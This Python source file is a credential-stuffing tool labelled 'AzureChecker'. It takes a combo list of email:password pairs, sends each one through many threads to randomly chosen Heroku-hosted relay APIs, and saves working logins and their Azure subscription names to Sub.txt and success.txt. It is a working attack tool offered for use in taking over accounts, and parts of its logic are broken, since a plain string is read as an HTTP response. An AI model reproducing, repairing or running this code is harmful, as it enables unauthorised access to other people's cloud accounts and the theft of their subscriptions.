import requests
import sys
import os
from threading import Thread
import tkinter
from colorama import init,Fore
from ctypes import windll
from tkinter import filedialog
from multiprocessing.dummy import Pool
import random
import tqdm
import json
import time
import datetime
import zipfile
import yaml
import re
import urllib3
from requests import Session
import html
from time import strftime
import wmi
import json
import hashlib

class ALL:
    Now_User = "Open"
    apimode = 2
    a = ""
    f = open("apis.txt", "r")
    Api_list = f.read().split("\n")
    Api_number = len(Api_list)
    good = 0
    sub = 0
    bad = 0
    repeat_sub = 0
    repeat_good = 0
class Main:
    def __init__(self):
        self.threads = input("Threads:")
        self.reck = input("Re:")
        while True:
            try:
                file = filedialog.askopenfilename(initialdir=(os.getcwd()), title='Select A Combos',
                                                  filetypes=(('txt files', '*.txt'),
                                                             ('all files', '*.*')))
                self.combolist = open(file, 'r', encoding='u8', errors='ignore').read().split('\n')
                break
            except:
                print(f"{Fore.LIGHTRED_EX}You didn't choose Combo")
                continue
        print(f"Import:{Fore.LIGHTBLUE_EX+str(len(self.combolist))}")
        os.system("cls")
        if len(self.combolist) < int(self.threads):
            self.threads = self.combolist
        Thread(target=self.title, daemon=True).start()
        pool = Pool(int(self.threads))

        res = pool.imap_unordered(func=self.task, iterable=self.combolist)
        oc = []
        for r in res:
            if r[0]:
                if r[1] == "N":
                    if r[2] == "dbn":
                        ALL.good += 1
                    elif r[2] == "dby":
                        ALL.repeat_good += 1
                elif r[1] == "Y":
                    if r[2] == "dbn":
                        ALL.sub += 1
                    elif r[2] == "dby":
                        ALL.repeat_sub += 1
            else:
                ALL.bad += 1
        for t in oc:
            t.join()
        pool.close()
        os.system('pause')
        sys.exit()
    def task(self,line):
        try:
            user,passwd = str(line).split(":")

            for i in range(int(self.reck)):
                back = self.checker(user=user,passwd=passwd)
                if back[0]:

                    if back[1] == "N":
                        Temp_repeat = "false"
                        if json.loads(Temp_repeat.text)["data"]["result"] == "true":

                            time.sleep(random.uniform(0.1,0.5))
                            print(f'{Fore.BLUE}[+] [repeat] {user} [{json.loads(Temp_repeat.text)["data"]["jointime"]}]')
                            with open(f'repeat-success.txt', 'a+') as f:
                                f.write(f'{line}\n')
                            return [True,"N","dby"]
                        elif json.loads(Temp_repeat.text)["data"]["result"] == "false":

                            time.sleep(random.uniform(0.2,0.5))
                            print(f'{Fore.BLUE}[+] {user}')
                            with open(f'success.txt', 'a+') as f:
                                f.write(f'{line}\n')
                            return [True,"N","dbn"]
                    elif back[1] == "Y":
                        Temp_repeat = "false"
                        if json.loads(Temp_repeat.text)["data"]["result"] ==  "true":
                            sub_int = len(json.loads(back[2]))
                            Temp = ""
                            Temp2 = ""
                            for i in range(sub_int):
                                Temp += json.loads(back[2])[i-1]["name"]+"/"
                                Temp2 += json.loads(back[2])[i-1]["state"] + "/"
                            time.sleep(random.uniform(0.1,0.5))
                            print(f'{Fore.GREEN}[+] [repeat] {user} [{json.loads(Temp_repeat.text)["data"]["jointime"]}] | sub:{Temp} | state:{Temp2}')
                            with open(f'repeat-Sub.txt', 'a+') as f:
                                f.write(f'{line} | Sub:{Temp} | state:{Temp2}\n')
                            return [True,"Y","dby"]
                        elif json.loads(Temp_repeat.text)["data"]["result"] ==  "false":
                            sub_int = len(json.loads(back[2]))
                            Temp = ""
                            Temp2 = ""
                            for i in range(sub_int):
                                Temp += json.loads(back[2])[i-1]["name"]+"/"
                                Temp2 += json.loads(back[2])[i-1]["state"] + "/"

                            time.sleep(random.uniform(0.2,0.5))
                            print(f'{Fore.GREEN}[+] {user} | sub:{Temp} | state:{Temp2}')
                            with open(f'Sub.txt', 'a+') as f:
                                f.write(f'{line} | Sub:{Temp} | state:{Temp2}\n')
                            return [True,"Y","dbn"]
            return [False]
        except:
            return [False]
    def checker(self,user,passwd):
        while True:
            try:
                #print(getap/subscriptions?email={user}&password={passwd}i+f"api")
                nowapi = random.choice(ALL.Api_list)
                #print(nowapi)
                if ALL.apimode == 2:
                    res = requests.get(f"https://{nowapi}.herokuapp.com/api/subscriptions?email={user}&password={passwd}")


                if len(json.loads(res.text)) == 0:
                    if "[]" in res.text:
                        return [True, "N"]
                    else:
                        return [False]
                elif "detail" in res.text:
                    if json.loads(res.text)["detail"] != None:
                        return [False]
                    else:
                        return [False]
                elif "id" in res.text and "name" in res.text and "state" in res.text and "tenantId" in res.text:
                    if json.loads(res.text)[0]["name"] != None:
                        return [True,"Y",res.text]
                    else:
                        return [False]
                else:
                    continue
            except Exception as e:
                #print(e)
                continue
    def title(self):
        while True:
            windll.kernel32.SetConsoleTitleW(f"AzureChecker({ALL.Now_User}) | Good:{ALL.good} | Bad:{ALL.bad} | subscriptions:{ALL.sub} | repeat-good:{ALL.repeat_good} | repeat-sub:{ALL.repeat_sub} | Checked {ALL.bad+ALL.good+ALL.repeat_good+ALL.repeat_sub} of {len(self.combolist)}")

if __name__ == "__main__":
    root = tkinter.Tk()
    root.withdraw()
    Main()
